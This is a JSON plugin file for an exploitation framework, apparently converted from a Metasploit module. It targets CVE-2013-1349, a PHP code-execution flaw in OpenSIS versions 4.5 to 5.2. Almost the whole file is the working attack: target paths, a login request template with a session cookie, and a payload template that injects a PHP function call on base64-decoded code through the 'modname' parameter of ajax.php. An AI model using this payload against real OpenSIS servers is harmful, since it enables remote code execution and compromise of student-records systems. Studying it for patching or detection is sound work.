{
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "type" : "MSF",
   "path" : "ajax.php?",
   "informations" : {
      "PLATFORM" : "UNIX",
      "TYPE" : "MSF",
      "PATHS" : [
         "ajax.php",
         "opensis/"
      ],
      "REFERENCES" : [
         "http://karmainsecurity.com/KIS-2013-10",
         "http://sourceforge.net/p/opensis-ce/bugs/59/"
      ],
      "PATH" : "ajax.php?",
      "METHOD" : "POST",
      "DESCRIPTION" : "\n\n        This module exploits a PHP code execution vulnerability in OpenSIS\n\n        versions 4.5 to 5.2 which allows any authenticated user to execute\n\n        arbitrary PHP code under the context of the web-server user.\n\n        The 'ajax.php' file calls 'eval()' with user controlled data from\n\n        the 'modname' parameter.\n\n      ",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "PAYLOAD" : "USERNAME=__USERNAME__&PASSWORD=__PASSWORD__",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded",
               "Cookie" : "PHPSESSID=sdAXfRPAOsL;"
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /index.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "index.php",
            "METHOD" : "POST"
         }
      },
      "name" : "OpensisModnameExec",
      "OSVDB" : 100676,
      "PAYLOAD" : "modname=__JUNK__?__JUNK__=__JUNK__;__OPTS\\[\\:PHP_FUNCTION\\]__(base64_decode(__CODE__));//&",
      "CVE" : "CVE-2013-1349",
      "MSF_MODULE" : "opensis_modname_exec",
      "VARIABLES" : {
         "PATH" : {
            "VALUE" : "/opensis/",
            "DESCRIPTION" : "The URI for OpenSIS"
         },
         "JUNK" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "CODE" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "OPTS[:PHP_FUNCTION]" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         }
      }
   },
   "detection" : {},
   "payload" : "modname=__JUNK__?__JUNK__=__JUNK__;__OPTS\\[\\:PHP_FUNCTION\\]__(base64_decode(__CODE__));//&",
   "variables" : {
      "PATH" : {
         "VALUE" : "/opensis/",
         "DESCRIPTION" : "The URI for OpenSIS"
      },
      "OPTS[:PHP_FUNCTION]" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "JUNK" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "CODE" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      }
   },
   "description" : "\n\n        This module exploits a PHP code execution vulnerability in OpenSIS\n\n        versions 4.5 to 5.2 which allows any authenticated user to execute\n\n        arbitrary PHP code under the context of the web-server user.\n\n        The 'ajax.php' file calls 'eval()' with user controlled data from\n\n        the 'modname' parameter.\n\n      ",
   "platform" : "UNIX",
   "method" : "POST",
   "paths" : [
      "ajax.php",
      "opensis/"
   ],
   "osvdb" : 100676,
   "requests" : {
      "EXPLOIT2" : {
         "PAYLOAD" : "USERNAME=__USERNAME__&PASSWORD=__PASSWORD__",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded",
            "Cookie" : "PHPSESSID=sdAXfRPAOsL;"
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /index.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "index.php",
         "METHOD" : "POST"
      }
   },
   "msf_module" : "opensis_modname_exec",
   "references" : [
      "http://karmainsecurity.com/KIS-2013-10",
      "http://sourceforge.net/p/opensis-ce/bugs/59/"
   ],
   "name" : "OpensisModnameExec",
   "cve" : "CVE-2013-1349"
}
